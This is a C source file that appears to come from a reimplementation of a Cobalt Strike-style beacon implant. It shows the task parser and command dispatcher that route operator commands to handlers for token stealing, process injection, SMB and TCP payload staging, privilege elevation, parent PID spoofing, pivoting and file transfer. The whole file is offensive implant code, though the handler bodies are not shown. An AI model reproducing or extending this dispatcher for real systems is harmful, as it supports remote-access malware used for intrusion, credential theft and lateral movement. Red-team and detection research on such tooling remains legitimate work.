#include "pch.h"

#include "job.h"
#include "argument.h"
#include "beacon.h"
#include "channel.h"
#include "command.h"
#include "download.h"
#include "filesystem.h"
#include "identity.h"
#include "inline_execute_object.h"
#include "link.h"
#include "network.h"
#include "self.h"
#include "spawn.h"
#include "stage.h"
#include "powershell.h"
#include "process.h"
#include "web_response.h"

void TaskDispatch(int cmd, char* buffer, int size)
{
	switch (cmd)
	{
		case COMMAND_BLOCKDLLS:
			BlockDlls(buffer, size);
			return;
		case COMMAND_INLINE_EXECUTE_OBJECT:
			InlineExecuteObject(buffer, size);
			return;
		case COMMAND_LSOCKET_BIND_LOCALHOST:
			ChannelLSocketBind(buffer, size, LOCALHOST);
			return;
		case COMMAND_LSOCKET_BIND:
			ChannelLSocketBind(buffer, size, 0);
			return;
		case COMMAND_SPAWNU_X86:
			SpawnUnder(buffer, size, TRUE);
			return;
		case COMMAND_SPAWNU_X64:
			SpawnUnder(buffer, size, FALSE);
			return;
		case COMMAND_SPAWNAS_X86:
			SpawnAsUser(buffer, size, TRUE);
			return;
		case COMMAND_SPAWNAS_X64:
			SpawnAsUser(buffer, size, FALSE);
			return;
		case COMMAND_LSOCKET_TCPPIVOT:
			ChannelLSocketTcpPivot(buffer, size);
			return;
		case COMMAND_ARGUE_ADD:
			ArgumentAdd(buffer, size);
			return;
		case COMMAND_ARGUE_REMOVE:
			ArgumentRemove(buffer, size);
			return;
		case COMMAND_ARGUE_LIST:
			ArgumentList();
			return;
		case COMMAND_TCP_CONNECT:
			LinkViaTcp(buffer, size);
			return;
		case COMMAND_PSH_HOST_TCP:
			PowershellHostTcp(buffer, size);
			return;
		case COMMAND_JOB_SPAWN_X86:
			JobSpawn(buffer, size, TRUE, TRUE);
			return;
		case COMMAND_JOB_SPAWN_X64:
			JobSpawn(buffer, size, FALSE, TRUE);
			return;
		case COMMAND_JOB_SPAWN_TOKEN_X86:
			JobSpawn(buffer, size, TRUE, FALSE);
			return;
		case COMMAND_JOB_SPAWN_TOKEN_X64:
			JobSpawn(buffer, size, FALSE, FALSE);
			return;
		case COMMAND_SPAWN_PROC_X64:
			SpawnSetTo(buffer, size, FALSE);
			return;
		case COMMAND_SPAWN_PROC_X86:
			SpawnSetTo(buffer, size, TRUE);
			return;
		case COMMAND_FILE_DRIVES:
			FilesystemDrives(buffer, size);
			return;
		case COMMAND_FILE_RM:
			FilesystemRemove(buffer, size);
			return;
		case COMMAND_STAGE_PAYLOAD_SMB:
			StagePayloadViaPipe(buffer, size);
			return;
		case COMMAND_WEBSERVER_LOCAL:
			WebServerLocal(buffer, size);
			return;
		case COMMAND_ELEVATE_PRE:
			IdentityElevatePre(buffer, size);
			return;
		case COMMAND_ELEVATE_POST:
			IdentityElevatePost();
			return;
		case COMMAND_PIPE_OPEN_EXPLICIT:
			ProtocolSmbOpenExplicit(buffer);
			return;
		case COMMAND_UPLOAD_CONTINUE:
			Upload(buffer, size, "wb");
			return;
		case COMMAND_UPLOAD:
			Upload(buffer, size, "ab");
			return;
		case COMMAND_JOB_REGISTER:
			JobRegister(buffer, size, FALSE, FALSE);
			return;
		case COMMAND_JOB_REGISTER_IMPERSONATE:
			JobRegister(buffer, size, TRUE, FALSE);
			return;
		case COMMAND_JOB_REGISTER_MSGMODE:
			JobRegister(buffer, size, FALSE, TRUE);
			return;
		case COMMAND_EXECUTE_JOB:
			JobExecute(buffer, size);
			return;
		case COMMAND_GETPRIVS:
			IdentityGetPrivileges(buffer, size);
			return;
		case COMMAND_RUN_UNDER_PID:
			RunUnderPid(buffer, size);
			return;
		case COMMAND_PPID:
			RunSetParentPid(buffer, size);
			return;
		case COMMAND_FILE_MOVE:
			FilesystemMove(buffer, size);
			return;
		case COMMAND_FILE_COPY:
			FilesystemCopy(buffer, size);
			return;
		case COMMAND_SETENV:
			putenv(buffer);
			return;
		case COMMAND_FILE_MKDIR:
			FilesystemMkdir(buffer, size);
			return;
		case COMMAND_STEAL_TOKEN:
			IdentityStealToken(buffer, size);
			return;
		case COMMAND_PS_LIST:
			ProcessList(buffer, size);
			return;
		case COMMAND_PS_KILL:
			ProcessKill(buffer, size);
			return;
		case COMMAND_PSH_IMPORT:
			PowershellImport(buffer, size);
			return;
		case COMMAND_RUNAS:
			RunAsUser(buffer, size);
			return;
		case COMMAND_PWD:
			FilesystemPwd();
			return;
		case COMMAND_JOB_KILL:
			JobKill(buffer, size);
			return;
		case COMMAND_JOBS:
			JobPrintAll();
			return;
		case COMMAND_PAUSE:
			Pause(buffer, size);
			return;
		case COMMAND_LOGINUSER:
			IdentityLoginUser(buffer, size);
			return;
		case COMMAND_FILE_LIST:
			FilesystemList(buffer, size);
			return;
		case COMMAND_STAGE_PAYLOAD:
			StagePayloadViaTcp(buffer, size);
			return;
		case COMMAND_LSOCKET_CLOSE:
			ChannelLSocketClose(buffer, size);
			return;
		case COMMAND_INJECT_PID_PING:
			InjectIntoPidAndPing(buffer, size, TRUE);
			return;
		case COMMAND_INJECTX64_PID_PING:
			InjectIntoPidAndPing(buffer, size, FALSE);
			return;
		case COMMAND_TOKEN_REV2SELF:
			BeaconRevertToken();
			return;
		case COMMAND_SEND:
			ChannelSend(buffer, size);
			return;
		case COMMAND_CLOSE:
			ChannelClose(buffer, size);
			return;
		case COMMAND_LISTEN:
			ChannelListen(buffer, size);
			return;
		case COMMAND_TOKEN_GETUID:
			IdentityGetUid();
			return;
		case COMMAND_PIPE_REOPEN:
			PipeReopen(buffer, size);
			return;
		case COMMAND_PIPE_CLOSE:
			PipeClose(buffer, size);
			return;
		case COMMAND_PIPE_ROUTE:
			PipeRoute(buffer, size);
			return;
		case COMMAND_CANCEL_DOWNLOAD:
			DownloadCancel(buffer, size);
			return;
		case COMMAND_INJECT_PING:
			SpawnAndPing(buffer, size, TRUE);
			return;
		case COMMAND_INJECTX64_PING:
			SpawnAndPing(buffer, size, FALSE);
			return;
		case COMMAND_CONNECT:
			ChannelConnect(buffer, size);
			return;
		case COMMAND_SPAWN_TOKEN_X86:
			Spawn(buffer, size, TRUE, FALSE);
			return;
		case COMMAND_SPAWN_TOKEN_X64:
			Spawn(buffer, size, FALSE, FALSE);
			return;
		case COMMAND_SPAWNX64:
			Spawn(buffer, size, FALSE, TRUE);
			return;
		case COMMAND_DIE:
			Die();
			return;
		case COMMAND_SLEEP:
			SleepSet(buffer, size);
			return;
		case COMMAND_CD:
			FilesystemCd(buffer, size);
			return;
		case COMMAND_EXECUTE:
			Execute(buffer, size);
			return;
		case COMMAND_DOWNLOAD:
			DownloadDo(buffer, size);
			return;
		default:
			LERROR("Unknown command: %d", cmd);
			return;
	}
}

void TaskProcess(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int remaining;
	do
	{
		int cmd = BeaconDataInt(&parser);
		int size = BeaconDataInt(&parser);
		char* data = BeaconDataPtr(&parser, size);

		remaining = BeaconDataLength(&parser);
		if (remaining < 0) // this should never happen
			return;

		TaskDispatch(cmd, data, size);
	} while (remaining > 0);

	BeaconDataZero(&parser);
}

